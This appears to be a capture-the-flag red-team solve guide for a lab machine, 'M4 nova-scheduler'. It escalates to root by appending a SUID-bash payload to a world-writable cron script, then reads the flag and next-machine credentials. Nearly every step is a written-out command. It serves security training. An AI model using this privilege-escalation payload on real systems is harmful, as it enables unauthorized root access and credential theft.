# 🔴 Red Team — M4: nova-scheduler Solve Guide

**Challenge:** World-Writable Cron Script → Root Privilege Escalation  
**Technique:** T1053.003 — Scheduled Task/Job: Cron  
**Entry Point:** SSH as `backup` / `Backups3cure`

---

## Step 1 — SSH Login

```bash
ssh backup@<M4-IP>
# Password: Backups3cure
```

---

## Step 2 — Enumerate Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
```

Output:
```
* * * * * root /opt/scripts/maintenance.sh
```

---

## Step 3 — Check File Permissions

```bash
ls -la /opt/scripts/maintenance.sh
```

Output:
```
-rwxrwxrwx 1 root root ... /opt/scripts/maintenance.sh
```

The file is **world-writable** (777) but executed as root every minute!

---

## Step 4 — Exploit: SUID Bash Copy

Append a payload to copy bash with SUID bit:

```bash
echo 'cp /bin/bash /tmp/.suid_bash; chmod +s /tmp/.suid_bash' >> /opt/scripts/maintenance.sh
```

---

## Step 5 — Wait for Cron (up to 60 seconds)

```bash
watch -n 1 ls -la /tmp/.suid_bash
# Wait until you see -rwsr-xr-x (SUID set by root cron)
```

---

## Step 6 — Get Root Shell

```bash
/tmp/.suid_bash -p       # -p flag preserves effective UID (root)
whoami                   # should output: root
id
```

---

## Step 7 — Read Flag and Credentials

```bash
cat /root/flag4.txt
cat /root/secrets.txt
# → archivist:Arch1v1st99 on M5
```

---

## Flag Location
`/root/flag4.txt`
